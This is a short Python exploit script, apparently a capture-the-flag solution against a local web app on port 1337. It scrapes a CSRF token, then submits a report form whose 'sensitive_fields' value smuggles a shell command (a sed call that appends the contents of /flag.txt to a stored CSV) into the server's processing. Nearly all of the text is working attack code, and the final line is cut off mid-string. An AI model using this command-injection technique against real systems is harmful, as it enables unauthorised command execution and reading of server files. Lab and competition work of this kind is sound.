import requests
import os
from bs4 import BeautifulSoup

url_create_report = "http://host.docker.internal:1337/reports/create"
url_reports = "http://host.docker.internal:1337/reports"
csv_file_path = "dummy.csv"
payload = "'; sed -i 's/$/$(cat /flag.txt)/' /app/storage/app/sanitized_reports/dummy.csv #'"

# Create a dummy CSV file if it doesn't exist
if not os.path.exists(csv_file_path):
    with open(csv_file_path, "w") as f:
        f.write("email,name\ntest@example.com,Test User")

# 1. Get the create report page to retrieve the CSRF token
try:
    session = requests.Session()
    response_get = session.get(url_create_report)
    response_get.raise_for_status()  # Raise an exception for bad status codes

    soup = BeautifulSoup(response_get.content, 'html.parser')
    csrf_token = soup.find('input', {'name': '_token'})['value']
    print(f"CSRF Token: {csrf_token}")

    # 2. Prepare the POST request with the CSRF token
    files = {
        "csv_file": (csv_file_path, open(csv_file_path, "rb"), "text/csv")
    }
    data = {
        "sensitive_fields": payload,
        "_token": csrf_token,  # Include the CSRF token in the POST data
        "title": "test",
        "description": "",
        "chart_type": "bar",
        "x_axis": "email",
        "y_axis": "name"
    }

    # 3. Send the POST request
    response_post = session.post(url_reports, files=files, data=data)
    print(f"Response status code: {response_post.status_code}")
    print(f"Response text: {response_post.text}")

except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")
except (TypeError, KeyError) as e:
    print(f"Error parsing HTML for CSRF token: {e}